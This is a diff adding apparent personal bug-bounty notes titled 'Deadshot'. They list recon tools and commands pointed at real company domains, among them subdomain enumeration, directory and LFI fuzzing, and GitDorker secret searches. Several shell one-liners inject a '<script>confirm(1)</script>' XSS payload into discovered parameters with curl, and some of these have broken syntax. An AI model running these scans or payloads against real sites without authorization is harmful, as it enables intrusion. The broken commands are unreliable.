@@ -1,0 +1,145 @@
+Deadshot
+
+step 1:- Find target domains list
+
+https://medium.com/bugbountywriteup/recon-everything-48aafbb8987
+
+→  sublister
+→ subfinder
+→  crtsh
+→ censys
+→  certspotter.com
+→  shodan.io
+→ waybackurls
+ cat domains.txt | waybackurls > urls
+→ amass
+>> amass enum -o subdomains.txt -d output_file.txt
+>> amass enum -o out.txt -df domains.txt
+>> amass intel -whois -d example.com
+>> amass enum -d media.yahoo.com
+>> amass enum --passive -d media.yahoo.com
+>> amass enum -passive -d $domain -o $domain/sources/passive.txt
+→ lazyrecon
+>> ./lazyrecon.sh -d rockstar.com -e rockstar.com
+→ Fantomjs
+→ aqaton
+→ dirsearch 
+→ asset finder
+→ amass
+→ Asnlookup
+→ massscan
+→ fuzzing
+    +++ wfuzz 
+    >> wfuzz -c -w /root/tools/SecLists/Fuzzing/LFI/dicc.txt http://testphp.vulnweb.com/FUZZ
+    >> https://scottc130.medium.com/how-to-use-wfuzz-to-fuzz-web-applications-8594c11d59d1
+→ >>
+→ altdns
+→  whatweb
+→  lab.detectify.com
+→ gowitness
+→ google search ::::::::    xml xss owasp
+→  whoisology
+→  nslookup
+→ findomain-linux
+>> chmod +x findomain-linux
+>> findomain -t example.com
+→  finddomain
+>> finddomain -t starbucks.com -r -o
+→ httpx
+→ lazyrecon
+>> ./lazyrecon.sh -d rockstar.com -e rockstar.com
+→ nuclei
+→  aquaton
+→  waybackurls
+→ gf
+→  shuffledns
+→  qsreplace
+→  ffuf
+>> ffuf -w /root/tools/SecLists/Discovery/Web-Content/raft-large-directories.txt -u "http://lyncws10.att.com/FUZZ"
+→  EyeWitness 
+→  jsparser
+→  massdns
+→  dnsvalidator
+→  gf patterns
+→  shodan
+→  bgp.he.net --google search
+→  paramspider tool
+→  devanshbatham/paramspider ->github
+ tool usage: 
+
+ -> python3 paramspider.py --domain example.com --output o example.txt
+ -> python3 paramspider.py --domain example.com --output o example.txt --level high
+ -> python3 paramspider.py --domain example.com --output o example.txt --level high --exclude woff,css,js,png,svg,php,jpg
+
+ -> python3 paramspider.py -d orientalbirdimages.org | tee yy.json | qsplace '"><script>confirm<script>' | while read host do ; do curl --silent -- path -as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n"; done
+
+ -> python3 paramspider.py --domain example.com --placeholder fuzzz
+ > payloads for seclists or payloadallthings
+
+-> python3 paramspider.py -d optimizely.com --subs false
+
+python3 paramspider.py -d optimizely.com --subs false --placeholder '"><script>confirm<script>' > optimizely.txt | while   read host do ; do curl --silent -- path -as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n"; done
+
+-> 
+
+>> hunt to live domains:-
+
+step1 
+
+python3 paramspider.py -d optimizely.com --subs false
+
+step2
+python3 paramspider.py -d optimizely.com
+
+step3
+python3 paramspider.py -d optimizely.com --subs false > optimizely.txt
+
+step4
+cat optimizely.txt
+
+step5
+python3 paramspider.py -d optimizely.com --subs false --placeholder '"/><script>confirm(1)</script>' > optimizely.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
+
+>> gau
+github.com/lc/gau
+gau -version
+gau apple.com -subs -o applesubs.txt
+
+
+ >> Linkfinder
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+→ python -m SimpleHTTPServer:9900
+→ killall -9 python
+
+python -m SimpleHTTPServer 9900
+killall -9 python
+killall -9 aquaton
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Github Recon
+
+→ GitDorker
+>> python3 GitDorker.py -q tesla.com -tf token.txt -d all.txt -o tesla.txt
+>> python GitDorker.py -q tesla.com -tf token.txt -d all.txt
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Fuzzing
+-----------
+
+>> github.com/danielmiessler/SecLists/tree/master/Fuzzing
+>> github.com/fuzzdb-project/fuzzdb
+>> github.com/swisskyrepo/PayloadsAllTheThings
+>> github.com/maurosoria/dirsearch/blob/master/db/dicc.txt
+
+Fuzzing for sensitive files
+>> github.com/maurosoria/dirsearch/blob/master/db/dicc.txt
+ 
+ ++ dirsearch/db/dicc.txt
+ 
+ -> wfuzz
+ >> pip install wfuzz
+ >> wfuzz -w wordlist.txt http://example.com/FUZZ
+ >> wfuzz -c -w /root/tools/SecLists/Fuzzing/LFI/dicc.txt http://testphp.vulnweb.com/FUZZ
+>> wfuzz -c --hc 404,400,403,500 -w /root/tools/SecLists/Fuzzing/LFI/dicc.txt http://testphp.vulnweb.com/FUZZ
